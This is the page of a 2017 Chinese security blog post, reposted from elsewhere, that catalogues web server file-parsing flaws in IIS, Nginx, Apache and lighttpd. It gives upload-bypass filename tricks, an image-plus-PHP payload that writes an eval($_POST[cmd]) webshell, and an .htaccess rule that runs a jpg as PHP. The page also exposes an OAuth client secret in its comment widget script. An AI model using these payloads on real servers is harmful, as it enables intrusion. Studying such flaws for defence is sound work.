<!DOCTYPE html>
<html lang="zh-CN">
 <head>
     <meta charset="utf-8" />
  <title>服务器解析漏洞汇总 | 14u9h&#39;Blog</title>
  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
  <link rel="stylesheet" href="https://14u9h.github.io//styles/main.css" />
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
   <script src="https://cdn.staticfile.org/highlight.js/9.15.9/highlight.min.js"></script>
    <script>hljs.initHighlightingOnLoad();</script>
 </head>
 <body>
     <div class="sidebar animated fadeInDown">
   <div class="logo-title">
    <div class="title">
     <img class="avatar" src="https://14u9h.github.io//images/avatar.png?v=1617068574134" width="180" height="128" />

     <div class="description">
      <p>#世界以痛吻我，偏要报之以歌</p>
     </div>
    </div>
   </div>
   <ul class="social-links">


    <li><a href="https://14u9h.github.io/atom.xml"><i class="fa fa-rss"></i></a></li>
 
    

    <li><a href="https://twitter.com/#"><i class="fa fa-twitter"></i></a></li>
 
    

    <li><a href="https://www.facebook.com/#"><i class="fa fa-facebook"></i></a></li>
 
    

    <li><a href="https://github.com/14u9h/"><i class="fa fa-github"></i></a></li>
 
    

    

    

    

    <li><a href="https://weibo.com/#"><i class="fa fa-weibo"></i></a></li>
 
    

    <li><a href="10000"><i class="fa fa-qq"></i></a></li>
 
    

    

   </ul>
   <div class="footer">
    <div class="by_farbox">
   Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
    </div>
    

    </div>
   </div>
  </div>
  <div class="main">
     <div class="page-top animated fadeInDown">
    <div class="nav">
    
     <li><a  href="/">首页</a></li>

     <li><a  href="/archives">归档</a></li>

     <li><a  href="/tags">标签</a></li>

     <li><a  href="/post/about">关于</a></li>

     <li><a  href="/post/Links">友链</a></li>

    </div>
    <div class="information">
     <div class="back_btn">
      <li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li>
     </div>
    </div>
   </div>
   <div class="autopagerize_page_element">
    <div class="content">
     <div class="post-page">
      <div class="post animated fadeInDown">
       <div class="post-title">
        <h3><a>服务器解析漏洞汇总</a></h3>
       </div>
       <div class="post-content">
        <h3 id="iis-60">IIS 6.0</h3>
<h4 id="目录解析xxaspxxjpg-xxjpg可替换为任意文本文件eg-xxtxt文本内容为后门代码">目录解析：/xx.asp/xx.jpg  xx.jpg可替换为任意文本文件(e.g. xx.txt)，文本内容为后门代码</h4>
<p>IIS6.0 会将 xx.jpg 解析为 asp 文件。</p>
<h4 id="后缀解析xxaspjpg-xxaspjpg此处需抓包修改文件名">后缀解析：/xx.asp;.jpg     /xx.asp:.jpg(此处需抓包修改文件名)</h4>
<p>IIS6.0 都会把此类后缀文件成功解析为 asp 文件。</p>
<p>（站长评论：IIS6.0解析漏洞的成因，可以查阅罗哥写的一篇短文：IIS文件名解析漏洞扼要分析）</p>
<p>{/xx.asp:.jpg 此类文件在Windows下不允许存在，:.jpg被自动除去，剩下/xx.asp}</p>
<p>（站长评论：发现错误，并不是不允许存在，这种路径叫做“NTFS数据流”，具体见：IIS6使用冒号上传漏洞，发现IIS6漏洞(上传利用) 底下的评论）</p>
<h4 id="默认解析xxasa-xxcer-xxcdx">默认解析：/xx.asa    /xx.cer   /xx.cdx</h4>
<p>IIS6.0 默认的可执行文件除了 asp 还包含这三种</p>
<p>（站长评论：这种主要是由于在 IIS 默认配置中，这几个后缀默认由 asp.dll 来解析，所以执行权限和 .asp 一摸一样，你可在配置中自行删除该后缀，以防止安全隐患）</p>
<p>此处可联系利用目录解析漏洞 /xx.asa/xx.jpg 或 /xx.cer/xx.jpg 或 xx.asa;.jpg</p>
<h3 id="iis-70iis-75nginx-0837">IIS 7.0/IIS 7.5/Nginx &lt;=0.8.37</h3>
<p>IIS 7.0/IIS 7.5/Nginx &lt;=0.8.37</p>
<p>在默认Fast-CGI开启状况下,在一个文件路径(/xx.jpg)后面加上/xx.php会将 /xx.jpg/xx.php 解析为 php 文件。</p>
<p>常用利用方法： 将一张图和一个写入后门代码的文本文件合并 将恶意文本写入图片的二进制代码之后，避免破坏图片文件头和尾</p>
<p>e.g.  copy xx.jpg/b + yy.txt/a xy.jpg</p>
<pre><code class="language-php">/b 即二进制[binary]模式

/a 即ascii模式 xx.jpg正常图片文件

yy.txt 内容 &lt;?PHP fputs(fopen(‘shell.php’,’w’),'&lt;?php eval($_POST[cmd])?&gt;’);?&gt;

意思为写入一个内容为 &lt;?php eval($_POST[cmd])?&gt; 名称为shell.php的文件
</code></pre>
<p>找个地方上传 xy.jpg ,然后找到 xy.jpg 的地址，在地址后加上 /xx.php 即可执行恶意文本。</p>
<p>然后就在图片目录下生成一句话木马 shell.php 密码 cmd</p>
<h3 id="nginx-0837">Nginx &lt;=0.8.37</h3>
<p>在Fast-CGI关闭的情况下，Nginx &lt;=0.8.37 依然存在解析漏洞</p>
<p>在一个文件路径(/xx.jpg)后面加上%00.php会将 /xx.jpg%00.php 解析为 php 文件。</p>
<p>（站长评论：从 /test.jpg/x.php 演变过来的，具体可以参考：Ngnix 空字节可远程执行代码漏洞）</p>
<h3 id="apache">Apache</h3>
<p>后缀解析：test.php.x1.x2.x3</p>
<p>Apache将从右至左开始判断后缀，若x3非可识别后缀，再判断x2，直到找到可识别后缀为止，然后将该可识别后缀进解析</p>
<p>test.php.x1.x2.x3 则会被解析为php</p>
<p>经验之谈：php|php3|phtml 多可被Apache解析</p>
<p>（站长评论：关于 apache 解析漏洞可以查阅“Apache 漏洞之后缀名解析漏洞”）</p>
<h3 id="其他一些可利用的">其他一些可利用的</h3>
<p>在windows环境下，xx.jpg[空格] 或xx.jpg. 这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点，这也是可以被利用的！</p>
<p>在向一台windows主机上传数据时，你可以抓包修改文件名，在后面加个空格或点，试图绕过黑名单，若上传成功，最后的点或空格都会被消除，这样就可得到shell。</p>
<p>我记得Fck Php 2.6就存在加空格绕过的漏洞。{Linux主机中不行，Linux允许这类文件存在}</p>
<p>如果在Apache中.htaccess可被应用（Apache的配置文件httpd.conf中对目录的AllowOverride设置为All时，apache会应用目录下.htaccess中的配置 By sfasfas），</p>
<p>且可以被上传，那可以尝试在.htaccess中写入:</p>
<p>&lt;FilesMatch “shell.jpg”&gt; SetHandler application/x-httpd-php </FilesMatch></p>
<p>shell.jpg换成你上传的文件，这样shell.jpg就可解析为php文件</p>
<h3 id="lighttpd">lighttpd</h3>
<p>xx.jpg/xx.php</p>
<p>[Add by El4pse]</p>
<p>PS:我并不保证我写的全对哦，如果有错的或遗漏的，请各位朋友帮忙纠正一下，谢谢</p>
<h5 id="以上转载于httpwwwcnseaycom806">以上转载于：<a href="http://www.cnseay.com/806/">http://www.cnseay.com/806/</a></h5>

       </div>
       <div class="post-footer">
        <div class="meta">
         <div class="info">
          <i class="fa fa-sun-o"></i>
          <span class="date">2017-06-06</span>
          <i class="fa fa-tag"></i>
          
          <a class="tag" href="https://14u9h.github.io/tag/jEzjIvmCk/" title="Web安全">Web安全 </a>
          
         </div>
        </div>
       </div>
      </div>
      <div class="share">
       <div class="evernote">
        <a class="fa fa-bookmark" href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank"></a>
       </div>
       <div class="weibo">
        <a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a>
       </div>
       <div class="twitter">
        <a class="fa fa-twitter" href="http://twitter.com/home?status=,https://14u9h.github.io/post/2017-Server-resolve-vulnerability/,;"></a>
       </div>
      </div>
      <div class="pagination">
       <ul class="clearfix">

        <li class="pre pagbuttons"><a class="btn" role="navigation" href="https://14u9h.github.io/post/2017-sqlmap-usage/" title="Sqlmap使用文档">上一篇</a></li>
         
        
        <li class="next pagbuttons"><a class="btn" role="navigation" href="https://14u9h.github.io/post/2015_Social_Engineering/" title=" 社会工程学文章">下一篇</a></li>
        
       </ul>
      </div>
        
          
            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>

<div id="gitalk-container"></div>

<script>

  var gitalk = new Gitalk({
    clientID: 'dce8c8190903e67ed74c',
    clientSecret: '841e23bef6d7396fffe05ca97cb0411b086a7a79',
    repo: '14u9h.github.io',
    owner: '14u9h',
    admin: ['14u9h'],
    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
    distractionFreeMode: false  // Facebook-like distraction free mode
  })

  gitalk.render('gitalk-container')

</script>

          
          
        
     </div>
    </div>
   </div>
  </div>
  <script src="https://14u9h.github.io//media/scripts/jquery.js"></script>
  <script src="https://14u9h.github.io//media/scripts/jquery-migrate-1.2.1.min.js"></script>
  <script src="https://14u9h.github.io//media/scripts/jquery.appear.js"></script>


 </body>
</html>